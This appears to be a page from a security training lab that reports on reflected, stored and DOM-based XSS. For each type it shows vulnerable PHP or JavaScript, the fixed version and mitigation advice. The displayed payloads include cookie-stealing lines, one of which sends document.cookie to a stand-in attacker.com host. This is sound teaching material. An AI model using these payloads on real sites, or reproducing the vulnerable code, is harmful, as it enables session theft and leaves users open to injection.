<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Vulnerability Patch Report: XSS</title>
  <?php include_once ROOT . '/shared/military-ui/header.php'; ?>
  <style>
    .patch-box {
      max-width: 900px;
      margin: 0 auto;
    }

    .vuln-card {
      background-color: var(--bg-surface);
      border: 1px solid var(--border-color);
      padding: 24px;
      margin-bottom: 24px;
      border-radius: 8px;
    }

    .vuln-card h2 {
      font-size: 15px;
      font-weight: 700;
      color: var(--text-primary);
      text-transform: uppercase;
      letter-spacing: 0.5px;
      margin-bottom: 12px;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .payload-card {
      background-color: rgba(220, 38, 38, 0.04);
      border-left: 3px solid var(--mil-red);
      padding: 14px 18px;
      font-family: var(--font-mono);
      font-size: 12px;
      margin: 12px 0;
      border-radius: 0 6px 6px 0;
      color: #f87171;
      word-break: break-all;
    }

    .remediation-card {
      background-color: rgba(13, 148, 136, 0.04);
      border-left: 3px solid var(--mil-green);
      padding: 14px 18px;
      font-family: var(--font-mono);
      font-size: 12px;
      margin: 12px 0;
      border-radius: 0 6px 6px 0;
      color: #2dd4bf;
      white-space: pre-wrap;
      word-break: break-all;
    }

    .code-tag-comment { color: #64748b; }
    .code-tag-string { color: #2dd4bf; }
    .code-tag-keyword { color: #fbbf24; }
  </style>
</head>

<body class="mil-body">
  <?php include_once ROOT . '/shared/sidebar.php'; ?>

  <!-- HEADER -->
  <div class="mission-header">
    <div class="mission-title">
      <i class="fas fa-file-shield text-blue-500"></i>
      <span>VULNERABILITY ANALYSIS REPORT</span>
    </div>
    <div class="mission-grid">
      <div class="mission-stat">
        <div class="stat-label">Vector</div>
        <div class="stat-value">Cross-Site Scripting (XSS)</div>
      </div>
      <div class="mission-stat">
        <div class="stat-label">Severity Clearance</div>
        <div class="stat-value danger">THREAT LEVEL: CRITICAL</div>
      </div>
    </div>
  </div>

  <div class="patch-box">
    <!-- Level 1: Reflected XSS -->
    <div class="vuln-card">
      <h2><i class="fas fa-satellite-dish text-amber-500"></i> Level 1: Reflected XSS</h2>
      <p class="text-xs text-slate-400 leading-relaxed mb-4"><strong>Attack Vector:</strong> Unsanitized URL search queries rendered directly into the viewport layout.</p>

      <h3 class="text-xs font-bold text-slate-300 uppercase tracking-wider mb-2">Vulnerable Input Payloads:</h3>
      <div class="payload-card">&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
      <div class="payload-card">&lt;img src=x onerror="fetch('/steal?c='+document.cookie)"&gt;</div>

      <h3 class="text-xs font-bold text-slate-300 uppercase tracking-wider mt-4 mb-2">Technical Remediation Fix:</h3>
      <div class="remediation-card"><span class="code-tag-comment">// ❌ VULNERABLE CODE:</span>
echo <span class="code-tag-string">"&lt;div&gt;"</span> . $_GET[<span class="code-tag-string">'q'</span>] . <span class="code-tag-string">"&lt;/div&gt;"</span>;

<span class="code-tag-comment">// ✅ SECURE REMEDIATION:</span>
echo <span class="code-tag-string">"&lt;div&gt;"</span> . htmlspecialchars($_GET[<span class="code-tag-string">'q'</span>], ENT_QUOTES, <span class="code-tag-string">'UTF-8'</span>) . <span class="code-tag-string">"&lt;/div&gt;"</span>;</div>

      <h3 class="text-xs font-bold text-slate-300 uppercase tracking-wider mt-4 mb-2">Core Mitigation Directives:</h3>
      <ul class="list-disc pl-5 text-xs text-slate-400 space-y-1.5 mt-2">
        <li>Escape arbitrary dynamic variables using <code>htmlspecialchars()</code> before browser output.</li>
        <li>Explicitly serve Content-Type parameters with a UTF-8 character format.</li>
      </ul>
    </div>

    <!-- Level 2: Stored XSS -->
    <div class="vuln-card">
      <h2><i class="fas fa-file-contract text-amber-500"></i> Level 2: Stored XSS</h2>
      <p class="text-xs text-slate-400 leading-relaxed mb-4"><strong>Attack Vector:</strong> Malicious payloads persistently saved into storage buffers and outputted raw to users.</p>

      <h3 class="text-xs font-bold text-slate-300 uppercase tracking-wider mb-2">Vulnerable Input Payload:</h3>
      <div class="payload-card">&lt;script&gt;new Image().src='http://attacker.com/steal?c='+document.cookie&lt;/script&gt;</div>

      <h3 class="text-xs font-bold text-slate-300 uppercase tracking-wider mt-4 mb-2">Technical Remediation Fix:</h3>
      <div class="remediation-card"><span class="code-tag-comment">// ❌ VULNERABLE CODE:</span>
foreach ($reports as $report) {
    echo <span class="code-tag-string">"&lt;td&gt;"</span> . $report[<span class="code-tag-string">'content'</span>] . <span class="code-tag-string">"&lt;/td&gt;"</span>;
}

<span class="code-tag-comment">// ✅ SECURE REMEDIATION:</span>
foreach ($reports as $report) {
    echo <span class="code-tag-string">"&lt;td&gt;"</span> . htmlspecialchars($report[<span class="code-tag-string">'content'</span>], ENT_QUOTES, <span class="code-tag-string">'UTF-8'</span>) . <span class="code-tag-string">"&lt;/td&gt;"</span>;
}</div>

      <h3 class="text-xs font-bold text-slate-300 uppercase tracking-wider mt-4 mb-2">Core Mitigation Directives:</h3>
      <ul class="list-disc pl-5 text-xs text-slate-400 space-y-1.5 mt-2">
        <li>Perform robust HTML sanitization inside dynamic database values during retrieval.</li>
        <li>Deploy tight Content Security Policies (CSP) to reject arbitrary script run conditions.</li>
      </ul>
    </div>

    <!-- Level 3: DOM XSS -->
    <div class="vuln-card">
      <h2><i class="fas fa-code text-amber-500"></i> Level 3: DOM XSS</h2>
      <p class="text-xs text-slate-400 leading-relaxed mb-4"><strong>Attack Vector:</strong> Client JavaScript parses location hash buffers directly into active innerHTML structures.</p>

      <h3 class="text-xs font-bold text-slate-300 uppercase tracking-wider mb-2">Vulnerable Input Payload:</h3>
      <div class="payload-card">#user=&lt;img src=x onerror="fetch('/steal?c='+document.cookie)"&gt;</div>

      <h3 class="text-xs font-bold text-slate-300 uppercase tracking-wider mt-4 mb-2">Technical Remediation Fix:</h3>
      <div class="remediation-card"><span class="code-tag-comment">// ❌ VULNERABLE CODE:</span>
const userInput = window.location.hash.substring(1);
document.getElementById(<span class="code-tag-string">'output'</span>).innerHTML = userInput;

<span class="code-tag-comment">// ✅ SECURE REMEDIATION:</span>
const userInput = window.location.hash.substring(1);
document.getElementById(<span class="code-tag-string">'output'</span>).textContent = userInput;</div>

      <h3 class="text-xs font-bold text-slate-300 uppercase tracking-wider mt-4 mb-2">Core Mitigation Directives:</h3>
      <ul class="list-disc pl-5 text-xs text-slate-400 space-y-1.5 mt-2">
        <li>Prefer safe API indicators such as <code>textContent</code> rather than writing properties like <code>innerHTML</code>.</li>
        <li>Strictly sanitize dynamic variables with DOMPurify scripts if writing custom HTML.</li>
      </ul>
    </div>

    <!-- GENERAL SUMMARY -->
    <div class="terminal-panel mt-6">
      <div class="terminal-header">
        <i class="fas fa-shield-alt text-blue-500"></i>
        <span>XSS Defense Regulations Overview</span>
      </div>
      <div class="terminal-body font-mono text-xs text-slate-400">
        <ol class="space-y-2.5">
          <li>1. Output Encoding: Always filter user variables dynamically with safe characters before HTML renders.</li>
          <li>2. HttpOnly Cookie: Configure session cookies with HttpOnly headers to isolate documents.</li>
        </ol>
      </div>
    </div>

    <div class="text-center mt-8">
      <a href="?page=labs" class="mil-button">
        <i class="fas fa-arrow-left"></i> Return to directives
      </a>
    </div>
  </div>

  <?php include_once ROOT . '/shared/military-ui/footer.php'; ?>
</body>

</html>